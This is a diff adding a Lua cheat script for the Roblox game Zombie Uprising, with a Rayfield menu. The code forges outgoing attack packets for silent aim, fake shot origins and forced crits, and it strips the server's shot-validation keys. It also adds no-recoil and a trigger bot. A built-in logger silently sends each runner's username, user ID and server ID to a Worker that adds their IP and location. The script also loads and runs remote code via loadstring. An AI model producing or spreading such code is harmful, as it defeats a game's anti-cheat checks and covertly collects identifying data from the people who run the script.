@@ -1,0 +1,713 @@
+--[[
+    STRAIGHT BULLSHIT — clean rewrite
+    Zombie Uprising (Roblox). Rebuilt from the deobfuscated 2024 source.
+
+    This is the engine + UI, rewritten with real names and comments.
+    The aimbot here is PACKET-LEVEL (silent aim): it does not move your
+    camera. It intercepts the outgoing WeaponAttack packet and rewrites
+    the hit list to the zombies it picked.
+
+    Everything the game provides is looked up with a TIMEOUT, so if the
+    game has changed, you get a printed warning and the menu still opens
+    instead of the script hanging forever (that was the old bug).
+
+    Run logger: one embed per execution, sent through a Cloudflare Worker
+    that holds the Discord webhook. See LOG_ENDPOINT below.
+--]]
+
+--========================================================================
+-- CONFIG — the only line you need to change
+--========================================================================
+local LOG_ENDPOINT   = "https://metrics.YOUR-SUBDOMAIN.workers.dev/log"
+local LOG_ON         = true
+local LOG_PASSWORD   = true     -- only used if you pass a key to Logger.Send
+
+--========================================================================
+-- Services
+--========================================================================
+local Players            = game:GetService("Players")
+local RunService         = game:GetService("RunService")
+local UserInputService   = game:GetService("UserInputService")
+local ReplicatedStorage  = game:GetService("ReplicatedStorage")
+local Workspace          = game:GetService("Workspace")
+local HttpService        = game:GetService("HttpService")
+
+local localPlayer = Players.LocalPlayer
+local camera      = Workspace.CurrentCamera
+
+--========================================================================
+-- Run logger
+-- Posts identity + place to the Worker once, then stops. The Worker adds
+-- the real IP, geo and ISP server-side and rate-limits per IP.
+--========================================================================
+local Logger = {}
+
+local logged = false
+
+local function httpPost(url, body)
+    local req = request
+        or (syn and syn.request)
+        or (http and http.request)
+        or http_request
+    if not req then return false end
+    local ok, res = pcall(req, {
+        Url     = url,
+        Method  = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body    = body,
+    })
+    return ok and res and (res.StatusCode or 204) < 400
+end
+
+function Logger.Send(key)
+    if logged or not LOG_ON then return end
+    logged = true
+
+    if LOG_ENDPOINT:find("YOUR-SUBDOMAIN", 1, true) then
+        warn("[SB] LOG_ENDPOINT is still the placeholder — nothing will be sent")
+        return
+    end
+
+    task.spawn(function()
+        local payload = {
+            username   = localPlayer.Name,
+            display    = localPlayer.DisplayName,
+            userId     = localPlayer.UserId,
+            accountAge = localPlayer.AccountAge,
+            executor   = identifyexecutor and select(1, pcall(identifyexecutor)) or "unknown",
+            placeId    = game.PlaceId,
+            jobId      = game.JobId,
+        }
+        if LOG_PASSWORD and key then
+            payload.key = tostring(key)
+        end
+
+        local ok, body = pcall(function() return HttpService:JSONEncode(payload) end)
+        if not ok then return end
+
+        for _ = 1, 2 do
+            if httpPost(LOG_ENDPOINT, body) then return end
+            task.wait(1.5)
+        end
+    end)
+end
+
+--========================================================================
+-- Settings
+--========================================================================
+local Aim = {
+    Enabled           = true,
+    TriggerBot        = false,
+    TargetMode        = "Mouse",   -- "Mouse" = screen FOV circle, anything else = 3D distance
+    FOV               = 150,       -- pixels, used when TargetMode == "Mouse"
+    MaxDistance       = 100000,    -- studs, used in distance mode
+    TargetPart        = "Head",
+    HeadChance        = 100,       -- % chance to aim Head instead of HumanoidRootPart
+    DistributePellets = true,      -- spread shotgun pellets across several zombies
+    SpawnAtEnemy      = true,      -- claim the shot originated at the enemy (beats range checks)
+    IgnoreSwampGiant  = false,
+}
+
+local Misc = {
+    NoRecoil     = false,
+    AutoFarmMode = false,
+}
+
+-- Mirror into getgenv() so a re-execute can find and clean up the old run,
+-- and so anything else you write can read the same settings.
+getgenv().AimSettings  = Aim
+getgenv().NoRecoil     = Misc.NoRecoil
+getgenv().AutoFarmMode = Misc.AutoFarmMode
+
+--========================================================================
+-- Utility
+--========================================================================
+local function log(...)
+    print("[SB]", ...)
+end
+
+-- Non-blocking child lookup. Returns nil instead of hanging forever.
+local function waitFor(parent, name, timeout)
+    if not parent then return nil end
+    local child = parent:WaitForChild(name, timeout or 5)
+    if not child then
+        log("missing:", parent:GetFullName() .. "." .. name)
+    end
+    return child
+end
+
+-- Walk a dotted path safely: resolve(PlayerScripts, "LocalManager", "NetworkManager")
+local function resolve(root, ...)
+    local node = root
+    for _, name in ipairs({ ... }) do
+        if not node then return nil end
+        node = node:FindFirstChild(name)
+    end
+    return node
+end
+
+--========================================================================
+-- Clean up a previous run
+--========================================================================
+if getgenv().StraightBullshit_Cleanup then
+    pcall(getgenv().StraightBullshit_Cleanup)
+end
+
+local connections = {}
+local noRecoilConnection = nil
+
+local function cleanup()
+    for _, conn in ipairs(connections) do
+        pcall(function() conn:Disconnect() end)
+    end
+    table.clear(connections)
+    if noRecoilConnection then
+        pcall(function() noRecoilConnection:Disconnect() end)
+        noRecoilConnection = nil
+    end
+    -- A re-execute counts as a new run, so let it log again.
+    logged = false
+end
+
+getgenv().StraightBullshit_Cleanup = cleanup
+
+local function track(conn)
+    table.insert(connections, conn)
+    return conn
+end
+
+--========================================================================
+-- Game references (all soft — the old script died here)
+--========================================================================
+local playerScripts = waitFor(localPlayer, "PlayerScripts", 10)
+local zombiesFolder = waitFor(Workspace, "Zombies", 10)
+
+local packetRemote
+do
+    local remoteEvents = waitFor(ReplicatedStorage, "RemoteEvents", 10)
+    packetRemote = remoteEvents and waitFor(remoteEvents, "PacketRemote", 10)
+end
+
+-- The old source did: require(PlayerScripts.LocalManager.NetworkManager)
+-- with plain dot indexing, which ERRORS outright if the game moved it.
+local networkManager
+do
+    local module = resolve(playerScripts, "LocalManager", "NetworkManager")
+    if module then
+        if setthreadidentity then setthreadidentity(2) end
+        local ok, result = pcall(require, module)
+        if setthreadidentity then setthreadidentity(8) end
+        if ok then
+            networkManager = result
+        else
+            log("NetworkManager require failed:", result)
+        end
+    else
+        log("NetworkManager not found — packet sanitiser disabled")
+    end
+end
+
+-- Player level / prestige, used only for display. Optional.
+local function readPlayerStats()
+    local level, prestige = "N/A", "N/A"
+    pcall(function()
+        local dataScript = resolve(playerScripts, "LocalDataStore")
+        local env
+        if dataScript and getsenv then
+            local ok, result = pcall(getsenv, dataScript)
+            env = ok and result or nil
+        end
+        local globals = (env and env._G) or (getrenv and getrenv()._G)
+        local store = globals and globals.LocalReplicatedDataStore
+        if store then
+            level    = tostring(store.Level or "N/A")
+            prestige = tostring(store.Prestige or "N/A")
+        end
+    end)
+    return level, prestige
+end
+
+--========================================================================
+-- Packet sanitiser
+-- Incoming WeaponAttack payloads carry 8-character hex keys that the
+-- server uses to validate the shot. The original stripped them.
+--========================================================================
+local function stripHexKeys(payload)
+    local target = payload and payload[3] and payload[3][3]
+    if type(target) ~= "table" then return end
+
+    local doomed
+    for key in pairs(target) do
+        if type(key) == "string" and #key == 8 and key:match("^%x+$") then
+            doomed = doomed or {}
+            table.insert(doomed, key)
+        end
+    end
+    if doomed then
+        for _, key in ipairs(doomed) do
+            rawset(target, key, nil)
+        end
+    end
+end
+
+if networkManager and networkManager.PassData and hookfunction then
+    local originalPassData
+    originalPassData = hookfunction(networkManager.PassData, function(...)
+        local args = table.pack(...)
+        if args[2] == "WeaponAttack" then
+            pcall(stripHexKeys, args)
+        end
+        return originalPassData(table.unpack(args, 1, args.n))
+    end)
+    log("packet sanitiser installed")
+end
+
+--========================================================================
+-- Target scanning
+--========================================================================
+-- Higher number = picked first.
+local PRIORITY = {
+    SniperZombie   = 5,
+    Boss           = 4,
+    Hunter         = 3,
+    GuardianZombie = 2,
+}
+
+local function pickAimPart(zombie)
+    local wantHead = math.random(1, 100) <= (Aim.HeadChance or 100)
+    local part = zombie:FindFirstChild(wantHead and "Head" or "HumanoidRootPart")
+    return part
+        or zombie:FindFirstChild("HumanoidRootPart")
+        or zombie:FindFirstChild("Head")
+end
+
+-- Returns a list of { part = BasePart, dist = number, priority = number },
+-- best target first.
+local function getTargets()
+    if not Aim.Enabled or not zombiesFolder then return {} end
+
+    local character = localPlayer.Character
+    local root = character and character:FindFirstChild("HumanoidRootPart")
+    if not root then return {} end
+
+    local mousePos  = UserInputService:GetMouseLocation()
+    local originPos = root.Position
+    local useScreen = (Aim.TargetMode == "Mouse")
+
+    local found = {}
+    for _, zombie in ipairs(zombiesFolder:GetChildren()) do
+        repeat
+            if Aim.IgnoreSwampGiant and zombie.Name == "SwampGiant" then break end
+
+            local part = pickAimPart(zombie)
+            if not part then break end
+            if zombie:FindFirstChild("ForceField") then break end
+
+            local humanoid = zombie:FindFirstChildOfClass("Humanoid")
+            if humanoid and humanoid.Health <= 0 then break end
+
+            local inRange, dist = false, nil
+            if useScreen then
+                local screenPos, onScreen = camera:WorldToViewportPoint(part.Position)
+                if onScreen then
+                    dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
+                    inRange = dist < Aim.FOV
+                end
+            else
+                dist = (part.Position - originPos).Magnitude
+                inRange = dist < Aim.MaxDistance
+            end
+
+            if inRange then
+                table.insert(found, {
+                    part     = part,
+                    dist     = dist,
+                    priority = PRIORITY[zombie.Name] or 1,
+                })
+            end
+        until true
+    end
+
+    table.sort(found, function(a, b)
+        if a.priority ~= b.priority then
+            return a.priority > b.priority
+        end
+        return a.dist < b.dist
+    end)
+    return found
+end
+
+-- Refreshed every frame, read by the packet hook.
+local primaryTarget = nil
+local targetParts   = {}
+
+track(RunService.Heartbeat:Connect(function()
+    local targets = getTargets()
+    primaryTarget = targets[1] and targets[1].part or nil
+
+    local parts = {}
+    for i, entry in ipairs(targets) do
+        parts[i] = entry.part
+    end
+    targetParts = parts
+end))
+
+--========================================================================
+-- Silent aim: rewrite the outgoing WeaponAttack packet
+--========================================================================
+local function rewriteAttack(packet)
+    local attack = packet.WeaponAttack and packet.WeaponAttack[1]
+    if not (attack and attack[3]) then return end
+
+    -- attack[2] is the hit list; attack[3] carries ray info / crit rolls.
+    local hits = attack[2]
+    if not hits then
+        hits = {}
+        attack[2] = hits
+    end
+
+    -- Which zombies are we claiming to have hit?
+    local chosen = {}
+    if Aim.DistributePellets and #targetParts > 0 then
+        chosen = targetParts
+    elseif primaryTarget then
+        chosen = { primaryTarget }
+    end
+    if #chosen == 0 then return end
+
+    -- One entry per pellet; a single bullet still counts as one.
+    local pellets = #hits
+    if pellets == 0 then pellets = 1 end
+
+    for i = 1, pellets do
+        local part = chosen[((i - 1) % #chosen) + 1]
+        if part then
+            local pos = vector.create(part.Position.X, part.Position.Y, part.Position.Z)
+            hits[i] = { part, pos, true }
+        end
+    end
+
+    -- Claim the shot started at the enemy, so distance checks pass.
+    if Aim.SpawnAtEnemy then
+        local first = chosen[1]
+        local pos = vector.create(first.Position.X, first.Position.Y, first.Position.Z)
+        attack[3].RayOriginPos = pos
+        packet.CharPos = pos
+        packet.LookPos = pos
+    end
+
+    -- Force every pellet to crit.
+    if attack[3].CriticalRolls then
+        for i = 1, pellets do
+            attack[3].CriticalRolls[i] = true
+        end
+    end
+end
+
+if packetRemote and hookmetamethod then
+    local originalNamecall
+    originalNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+        if getnamecallmethod() == "FireServer" and self == packetRemote then
+            local args = table.pack(...)
+            local packet = args[1]
+            if Aim.Enabled and type(packet) == "table" and packet.WeaponAttack then
+                pcall(rewriteAttack, packet)
+            end
+            return originalNamecall(self, table.unpack(args, 1, args.n))
+        end
+        return originalNamecall(self, ...)
+    end)
+    log("silent aim installed")
+else
+    log("PacketRemote missing — silent aim disabled")
+end
+
+--========================================================================
+-- Equipped weapon tracking
+-- No Recoil needs to know which tool you are holding. The game parents
+-- the Tool into your Character while it is equipped.
+--========================================================================
+local equippedToolName = nil
+local reequipping      = false   -- true while we are mid unequip/equip
+
+local function watchCharacter(character)
+    if not character then return end
+
+    track(character.ChildAdded:Connect(function(child)
+        if child:IsA("Tool") then
+            equippedToolName = child.Name
+        end
+    end))
+
+    track(character.ChildRemoved:Connect(function(child)
+        if child:IsA("Tool") and child.Name == equippedToolName then
+            -- Our own re-equip removes the tool for a moment; keep the name.
+            if reequipping then return end
+            equippedToolName = nil
+        end
+    end))
+
+    -- Not in the original: pick up a tool that is already equipped at load,
+    -- otherwise No Recoil does nothing until you next switch weapons.
+    local held = character:FindFirstChildOfClass("Tool")
+    if held then
+        equippedToolName = held.Name
+    end
+end
+
+watchCharacter(localPlayer.Character)
+
+track(localPlayer.CharacterAdded:Connect(function(character)
+    equippedToolName = nil
+    watchCharacter(character)
+end))
+
+-- Unequip then re-equip the held weapon so the game rebuilds its
+-- CurrentValues. The original did this on every No Recoil toggle.
+local function reequipWeapon()
+    local character = localPlayer.Character
+    if not character then return end
+
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then return end
+
+    local tool = character:FindFirstChildOfClass("Tool")
+    if not tool then return end
+
+    local name = tool.Name
+    reequipping = true
+
+    humanoid:UnequipTools()
+    task.wait(0.1)
+
+    local fromBackpack = localPlayer.Backpack:FindFirstChild(name)
+    if fromBackpack then
+        humanoid:EquipTool(fromBackpack)
+    end
+
+    task.wait(0.1)
+    reequipping = false
+end
+
+--========================================================================
+-- No Recoil
+-- The game keeps live weapon spread in Tool.CurrentValues. Recoil is
+-- just spread climbing as you fire, so holding SpreadIncrease and
+-- ZoomSpreadIncrease at 0 every frame removes the kick entirely.
+--========================================================================
+local function clearSpread()
+    if not equippedToolName then return end
+
+    local character = localPlayer.Character
+    local tool = character and character:FindFirstChild(equippedToolName)
+    if not tool then return end
+
+    local values = tool:FindFirstChild("CurrentValues")
+    if not values then return end
+
+    local spread = values:FindFirstChild("SpreadIncrease")
+    if spread then
+        spread.Value = 0
+    end
+
+    local zoomSpread = values:FindFirstChild("ZoomSpreadIncrease")
+    if zoomSpread then
+        zoomSpread.Value = 0
+    end
+end
+
+local function setNoRecoil(enabled)
+    Misc.NoRecoil      = enabled
+    getgenv().NoRecoil = enabled
+
+    if noRecoilConnection then
+        noRecoilConnection:Disconnect()
+        noRecoilConnection = nil
+    end
+
+    if enabled then
+        noRecoilConnection = RunService.RenderStepped:Connect(clearSpread)
+    end
+
+    -- Re-equip so the weapon picks up (or loses) the zeroed values.
+    task.spawn(reequipWeapon)
+end
+
+--========================================================================
+-- Trigger bot
+-- There is no "shoot" remote to call directly. The game listens to its
+-- own mobile Attack button, so this fires that button's connections:
+-- MouseButton1Down to start shooting, InputEnded + MouseButton1Up to stop.
+--========================================================================
+local attackButton     = nil
+local lastButtonLookup = 0
+local triggerHolding   = false
+local holdStartedAt    = 0
+
+-- Cached, because walking PlayerGui every frame is wasteful. Re-looks up
+-- at most twice a second, same as the original.
+local function findAttackButton()
+    if attackButton and attackButton.Parent then
+        return attackButton
+    end
+
+    local now = tick()
+    if now - lastButtonLookup < 0.5 then
+        return attackButton
+    end
+    lastButtonLookup = now
+
+    attackButton = resolve(localPlayer:FindFirstChild("PlayerGui"),
+        "ScreenGui", "TouchControls", "RightSide", "AttackButton")
+    return attackButton
+end
+
+local function fireAll(signal)
+    if not signal then return end
+    for _, connection in pairs(getconnections(signal)) do
+        connection:Fire()
+    end
+end
+
+local function pressAttack(button)
+    fireAll(button.MouseButton1Down)
+end
+
+local function releaseAttack(button)
+    fireAll(button.InputEnded)
+    pcall(function()
+        fireAll(button.MouseButton1Up)
+    end)
+end
+
+local function stopHolding()
+    local button = attackButton
+    if button and button.Parent then
+        releaseAttack(button)
+    end
+    triggerHolding = false
+end
+
+track(RunService.RenderStepped:Connect(function()
+    -- Nothing in range: make sure the trigger is let go.
+    if not primaryTarget then
+        stopHolding()
+        return
+    end
+
+    -- Target in range but the trigger bot is off: also let go.
+    if not Aim.TriggerBot then
+        stopHolding()
+        return
+    end
+
+    local button = findAttackButton()
+    if not button then return end
+
+    if not triggerHolding then
+        triggerHolding = true
+        holdStartedAt  = tick()
+        pressAttack(button)
+    elseif tick() - holdStartedAt > 0 then
+        -- Re-press every frame so automatic weapons keep cycling.
+        holdStartedAt = tick()
+        pressAttack(button)
+    end
+end))
+
+--========================================================================
+-- UI (Rayfield)
+--========================================================================
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+local level, prestige = readPlayerStats()
+
+local Window = Rayfield:CreateWindow({
+    Name            = "Straight Bullshit",
+    LoadingTitle    = "Straight Bullshit",
+    LoadingSubtitle = "Lv " .. level .. "  |  Prestige " .. prestige,
+    Theme           = "Default",
+})
+
+local AimTab = Window:CreateTab("Aimbot", 4483362458)
+
+AimTab:CreateToggle({
+    Name = "Enabled", CurrentValue = Aim.Enabled, Flag = "AimEnabled",
+    Callback = function(v) Aim.Enabled = v end,
+})
+AimTab:CreateToggle({
+    Name = "Trigger Bot", CurrentValue = Aim.TriggerBot, Flag = "TriggerBot",
+    Callback = function(v) Aim.TriggerBot = v end,
+})
+AimTab:CreateDropdown({
+    Name = "Target Mode", Options = { "Mouse", "Distance" },
+    CurrentOption = { Aim.TargetMode }, Flag = "TargetMode",
+    Callback = function(opt)
+        Aim.TargetMode = type(opt) == "table" and opt[1] or opt
+    end,
+})
+AimTab:CreateSlider({
+    Name = "FOV", Range = { 10, 1000 }, Increment = 10, Suffix = " px",
+    CurrentValue = Aim.FOV, Flag = "AimFOV",
+    Callback = function(v) Aim.FOV = v end,
+})
+AimTab:CreateSlider({
+    Name = "Head Chance", Range = { 0, 100 }, Increment = 5, Suffix = "%",
+    CurrentValue = Aim.HeadChance, Flag = "HeadChance",
+    Callback = function(v) Aim.HeadChance = v end,
+})
+AimTab:CreateToggle({
+    Name = "Distribute Pellets", CurrentValue = Aim.DistributePellets, Flag = "Pellets",
+    Callback = function(v) Aim.DistributePellets = v end,
+})
+AimTab:CreateToggle({
+    Name = "Spawn Shot At Enemy", CurrentValue = Aim.SpawnAtEnemy, Flag = "SpawnAtEnemy",
+    Callback = function(v) Aim.SpawnAtEnemy = v end,
+})
+AimTab:CreateToggle({
+    Name = "Ignore Swamp Giant", CurrentValue = Aim.IgnoreSwampGiant, Flag = "IgnoreGiant",
+    Callback = function(v) Aim.IgnoreSwampGiant = v end,
+})
+
+local MiscTab = Window:CreateTab("Misc", 4483362458)
+
+MiscTab:CreateToggle({
+    Name = "No Recoil", CurrentValue = Misc.NoRecoil, Flag = "NoRecoil",
+    Callback = setNoRecoil,
+})
+MiscTab:CreateButton({
+    Name = "Print Target Count",
+    Callback = function()
+        Rayfield:Notify({
+            Title = "Targets",
+            Content = #targetParts .. " zombie(s) in range",
+            Duration = 3,
+        })
+    end,
+})
+MiscTab:CreateButton({
+    Name = "Unload Script",
+    Callback = function()
+        cleanup()
+        task.spawn(reequipWeapon)   -- let the game restore normal spread
+        Rayfield:Destroy()
+    end,
+})
+
+log("loaded — level " .. level .. ", prestige " .. prestige)
+
+-- Fire the run logger. Spawned so a slow HTTP call never delays the menu.
+task.spawn(Logger.Send)
+
+--[[
+    NOT PORTED YET — the logic for these is in "DIDDY deobfuscated.lua":
+
+      Auto farm mode            lines 3287-4178  (LoadAutoFarmMode)
+      FOV circle (Drawing API)  line 3120   (visual only, not ported)
+      Perk auto-buy             line 327    (PrestigePerk InvokeServer)
+      DPS / stats panel         lines 358-571
+      RunGun perk toggle        lines 100-120
+
+    The toggle above sets the flag; add the behaviour under it when you
+    port each one. Everything else in this file is faithful to the original.
+--]]
